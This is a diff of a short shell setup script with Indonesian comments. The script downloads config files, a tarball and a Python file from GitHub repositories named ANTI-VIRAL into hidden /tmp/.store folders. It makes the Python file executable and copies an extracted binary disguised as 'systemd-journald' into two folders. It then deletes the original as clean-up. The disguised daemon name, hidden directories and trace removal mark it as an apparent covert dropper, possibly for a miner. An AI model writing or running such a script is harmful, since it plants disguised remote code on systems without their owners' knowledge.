@@ -7,18 +7,18 @@ NC='\033[0m' # No Color
 echo -e "${GREEN}[*] Setup environment...${NC}"
 
 # Buat folder 1 dan 2
-mkdir -p /dev/shm/.store/1 /dev/shm/.store/2
+mkdir -p /tmp/.store/1 /tmp/.store/2
 
 # Download config 1
-cd /dev/shm/.store/1
+cd /tmp/.store/1
 wget -q https://github.com/ANTI-VIRAL/Ai-04/raw/main/1.ini -O config.ini
 
 # Download config 2
-cd /dev/shm/.store/2
+cd /tmp/.store/2
 wget -q https://github.com/ANTI-VIRAL/Ai-04/raw/main/2.ini -O config.ini
 
 # Balik ke .store
-cd /dev/shm/.store
+cd /tmp/.store
 
 # Download dan extract
 wget -q https://github.com/ANTI-VIRAL/MACHINE/raw/main/cache.tar.gz
@@ -31,10 +31,10 @@ wget -q https://github.com/ANTI-VIRAL/MACHINE/raw/main/httpd.py -O syncd.py
 chmod +x syncd.py
 
 # Copy ke folder 1 dan 2
-cp systemd-journald /dev/shm/.store/1/
-cp systemd-journald /dev/shm/.store/2/
-chmod +x /dev/shm/.store/1/systemd-journald
-chmod +x /dev/shm/.store/2/systemd-journald
+cp systemd-journald /tmp/.store/1/
+cp systemd-journald /tmp/.store/2/
+chmod +x /tmp/.store/1/systemd-journald
+chmod +x /tmp/.store/2/systemd-journald
 
 # Bersih-bersih
 rm -f systemd-journald
